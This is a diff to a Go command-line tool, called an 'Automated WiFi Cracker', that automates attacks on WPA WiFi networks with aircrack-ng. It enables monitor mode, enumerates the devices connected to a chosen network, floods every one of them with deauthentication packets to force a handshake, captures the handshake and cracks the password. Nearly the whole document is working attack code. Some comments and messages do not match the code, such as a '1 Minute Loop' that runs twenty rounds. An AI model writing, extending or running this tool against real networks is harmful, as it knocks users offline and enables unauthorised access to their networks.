@@ -22,11 +22,11 @@ import (
 // Data Models
 // ==========================================
 type Network struct {
-	BSSID  string
-	CH     string
-	ESSID  string
-	Sec    string
-	Client string
+	BSSID   string
+	CH      string
+	ESSID   string
+	Sec     string
+	Clients []string // Slice to hold multiple connected clients
 }
 
 // ==========================================
@@ -55,50 +55,37 @@ func main() {
 	}
 
 	cyan.Println("=======================================")
-	cyan.Println("    Automated WiFi Cracker CLI v6.0   ")
+	cyan.Println("    Automated WiFi Cracker CLI v7.0   ")
 	cyan.Println("=======================================")
 
 	setupEnvironment()
 
-	reader := bufio.NewReader(os.Stdin)
-
-	white.Print("\n[*] Enter Wireless Interface (e.g., wlp1s0): ")
-	iface, err := reader.ReadString('\n')
-	if err != nil {
-		red.Printf("[-] Failed to read input: %v\n", err)
-		os.Exit(1)
-	}
-	iface = strings.TrimSpace(iface)
-	if iface == "" {
-		red.Println("[-] Interface name cannot be empty.")
-		os.Exit(1)
-	}
-
+	// Step 1: Auto-Detect and Select Interface
+	iface := selectInterface()
 	monIface = iface + "mon"
 
 	yellow.Println("\n[*] Enabling Monitor Mode...")
-	// Silently run airmon-ng commands to keep CLI clean
 	runCmdSilent("airmon-ng", "check", "kill")
 	runCmdSilent("airmon-ng", "start", iface)
 	green.Println("[+] Monitor Mode enabled successfully.")
 
 	defer cleanup()
 
-	// Step 1: Scan APs
+	// Step 2: Scan APs
 	networks := scanNetworks()
-	target := selectTarget(networks, reader)
+	target := selectTarget(networks)
 
-	// Step 2: Targeted Client Scan
-	yellow.Printf("\n[*] Locking Channel %s to find connected clients for '%s' (10s)...\n", target.CH, target.ESSID)
+	// Step 3: Targeted Client Scan & Display Table
+	yellow.Printf("\n[*] Scanning '%s' for connected devices (10s)...\n", target.ESSID)
 	target = findConnectedClients(target)
 
-	if target.Client != "" {
-		green.Printf("[+] Found connected device! MAC: %s\n", target.Client)
+	if len(target.Clients) > 0 {
+		printClientTable(target)
 	} else {
-		red.Println("[!] WARNING: No connected devices found. Broadcast deauth will be used (might fail on modern routers).")
+		red.Println("[!] WARNING: No connected devices found. Will attempt broadcast deauth.")
 	}
 
-	// Step 3: Directory Structure
+	// Step 4: Directory Structure
 	sanitizedEssid := strings.ReplaceAll(target.ESSID, " ", "_")
 	sanitizedEssid = strings.ReplaceAll(sanitizedEssid, "/", "_")
 	targetDir := filepath.Join("data", sanitizedEssid)
@@ -112,23 +99,77 @@ func main() {
 
 	capFile := filepath.Join(targetDir, "handshake")
 
-	// Step 4: Capture Handshake
+	// Step 5: Capture Handshake (Deauth All)
 	captureHandshake(target, capFile)
 
-	// Step 5: Verify Handshake
+	// Step 6: Verify Handshake
 	if !verifyHandshake(capFile) {
 		red.Println("\n[-] CRITICAL ERROR: Handshake NOT captured after 1 minute.")
 		red.Println("[-] Reason: No device reconnected, or router ignores deauth packets.")
-		red.Println("[-] Suggestion: Connect a device to this WiFi and use the internet, then run the script again.")
 		cleanup()
 		os.Exit(1)
 	}
 
 	green.Println("\n[+] Valid Handshake Captured Successfully!")
 
-	// Step 6: Crack Password
+	// Step 7: Crack Password
 	crackPassword(capFile, targetDir)
 	green.Printf("\n[+] All files for '%s' are stored in: %s\n", target.ESSID, targetDir)
+}
+
+// ==========================================
+// Interface Selection
+// ==========================================
+func selectInterface() string {
+	yellow.Println("\n[*] Detecting available wireless interfaces...")
+
+	// Read wireless interfaces from /sys/class/net/
+	entries, err := os.ReadDir("/sys/class/net/")
+	if err != nil {
+		red.Printf("[-] Failed to read interfaces: %v\n", err)
+		os.Exit(1)
+	}
+
+	var ifaces []string
+	for _, e := range entries {
+		// Check if it's a wireless interface
+		if _, err := os.Stat("/sys/class/net/" + e.Name() + "/wireless"); err == nil {
+			ifaces = append(ifaces, e.Name())
+		}
+	}
+
+	if len(ifaces) == 0 {
+		red.Println("[-] No wireless interfaces found. Exiting.")
+		os.Exit(1)
+	}
+
+	fmt.Println()
+	cyan.Println("=== Available Wireless Interfaces ===")
+	for i, iface := range ifaces {
+		fmt.Printf("[%d] %s\n", i+1, iface)
+	}
+
+	reader := bufio.NewReader(os.Stdin)
+	for {
+		white.Print("\n[*] Select an interface (enter number): ")
+		input, err := reader.ReadString('\n')
+		if err != nil {
+			red.Printf("[-] Failed to read input: %v\n", err)
+			os.Exit(1)
+		}
+
+		input = strings.TrimSpace(input)
+		choice, err := strconv.Atoi(input)
+
+		if err != nil || choice < 1 || choice > len(ifaces) {
+			red.Println("[-] ERROR: Invalid selection. Please enter a valid number.")
+			continue
+		}
+
+		selected := ifaces[choice-1]
+		green.Printf("[+] Interface Selected: %s\n", selected)
+		return selected
+	}
 }
 
 // ==========================================
@@ -161,7 +202,6 @@ func findConnectedClients(target Network) Network {
 
 	scanner := bufio.NewScanner(file)
 	isStation := false
-	var foundClients []string
 
 	for scanner.Scan() {
 		line := scanner.Text()
@@ -180,20 +220,29 @@ func findConnectedClients(target Network) Network {
 			targetBSSID := strings.TrimSpace(parts[5])
 			// If station is connected to our target BSSID
 			if targetBSSID == target.BSSID && stationMac != "" {
-				foundClients = append(foundClients, stationMac)
+				target.Clients = append(target.Clients, stationMac)
 			}
 		}
-	}
-
-	if len(foundClients) > 0 {
-		target.Client = foundClients[0] // Pick the first found client
 	}
 	os.Remove(scanFile + "-01.csv")
 	return target
 }
 
+func printClientTable(target Network) {
+	fmt.Println()
+	cyan.Println("=====================================================")
+	cyan.Printf("  Connected Devices for: %s\n", target.ESSID)
+	cyan.Println("=====================================================")
+	fmt.Printf("  %-5s | %-20s\n", "No.", "MAC Address")
+	fmt.Println("-----------------------------------------------------")
+	for i, mac := range target.Clients {
+		fmt.Printf("  %-5d | %-20s\n", i+1, mac)
+	}
+	cyan.Println("=====================================================")
+}
+
 func captureHandshake(target Network, capFile string) {
-	yellow.Println("\n[*] Starting Handshake Capture (Listening for up to 60 seconds)...")
+	yellow.Println("\n[*] Starting Handshake Capture (Listening for up to 300 seconds)...")
 
 	cmd := exec.Command("airodump-ng", "-c", target.CH, "--bssid", target.BSSID, "-w", capFile, monIface)
 	cmd.Stdout = nil
@@ -207,34 +256,42 @@ func captureHandshake(target Network, capFile string) {
 
 	time.Sleep(3 * time.Second) // Wait for airodump to lock channel
 
-	// 1 Minute Loop (4 attempts, 15 seconds each)
-	for i := 1; i <= 4; i++ {
-		yellow.Printf("\n[*] Attempt %d/4: Sending Deauth Burst (Waiting 15s for reconnect)...\n", i)
+	// 1 Minute Loop (20 attempts, 15 seconds each)
+	for i := 1; i <= 20; i++ {
+		yellow.Printf("\n[*] Attempt %d/20: Sending Deauth to ALL clients...\n", i)
 
-		deauthArgs := []string{"--deauth", "15", "-a", target.BSSID, monIface}
-		if target.Client != "" {
-			deauthArgs = append(deauthArgs, "-c", target.Client)
-			white.Printf("[*] Targeting specific client: %s\n", target.Client)
-		} else {
-			white.Println("[!] No specific client found. Sending broadcast deauth.")
+		// Deauth all clients concurrently
+		for _, clientMac := range target.Clients {
+			go func(cMac string) {
+				deauthArgs := []string{"--deauth", "15", "-a", target.BSSID, "-c", cMac, monIface}
+				deauthCmd := exec.Command("aireplay-ng", deauthArgs...)
+				deauthCmd.Stdout = nil
+				deauthCmd.Stderr = nil
+				deauthCmd.Start()
+
+				// Wait for this deauth to finish (15s) before exiting goroutine
+				deauthCmd.Wait()
+			}(clientMac)
 		}
 
-		// Run deauth silently
-		deauthCmd := exec.Command("aireplay-ng", deauthArgs...)
-		deauthCmd.Stdout = nil
-		deauthCmd.Stderr = nil
-		deauthCmd.Start()
-
-		time.Sleep(12 * time.Second) // Wait for client to reconnect
-
-		if deauthCmd.Process != nil {
-			deauthCmd.Process.Kill()
-			deauthCmd.Wait()
+		// If no clients were found, send a broadcast deauth
+		if len(target.Clients) == 0 {
+			go func() {
+				deauthArgs := []string{"--deauth", "15", "-a", target.BSSID, monIface}
+				deauthCmd := exec.Command("aireplay-ng", deauthArgs...)
+				deauthCmd.Stdout = nil
+				deauthCmd.Stderr = nil
+				deauthCmd.Start()
+				deauthCmd.Wait()
+			}()
 		}
+
+		// Wait 15 seconds for clients to reconnect and handshake to capture
+		time.Sleep(15 * time.Second)
 
 		// Check if handshake is captured early
 		if verifyHandshake(capFile) {
-			green.Println("[+] Handshake detected early! Stopping capture phase.")
+			green.Println("[+] Handshake detected! Stopping capture phase.")
 			if cmd.Process != nil {
 				cmd.Process.Kill()
 				cmd.Wait()
@@ -357,7 +414,8 @@ func scanNetworks() []Network {
 	return networks
 }
 
-func selectTarget(networks []Network, reader *bufio.Reader) Network {
+func selectTarget(networks []Network) Network {
+	reader := bufio.NewReader(os.Stdin)
 	for {
 		white.Print("\n[*] Enter the number of the target network: ")
 		input, err := reader.ReadString('\n')
